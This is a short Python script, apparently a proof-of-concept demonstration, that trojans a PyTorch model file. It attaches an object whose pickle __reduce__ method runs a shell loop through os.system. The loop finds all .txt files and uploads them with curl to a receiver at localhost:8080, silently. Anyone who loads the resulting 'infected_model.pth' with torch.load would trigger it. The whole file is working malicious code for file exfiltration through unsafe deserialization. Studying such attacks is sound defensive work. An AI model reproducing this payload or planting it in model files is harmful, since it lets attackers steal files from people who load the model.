import os
from simple_model import SimpleModel
import torch


class StealFiles:
    def __reduce__(self):
        return os.system, (f"""
for file in $(find . -type f -name "*.txt"); do
    echo "Stealing file: $file"
    curl -F "file=@$file" http://localhost:8080 -o /dev/null -s
done > /dev/null
""",)


def make_infected_model():
    # Load the original model
    malicious_model = torch.load("simple_model.pth")

    # Add the malicious class to the end of the model
    malicious_model.steal_files = (StealFiles())

    # Save the malicious model as a new file
    torch.save(malicious_model, "infected_model.pth")


if __name__ == "__main__":
    make_infected_model()
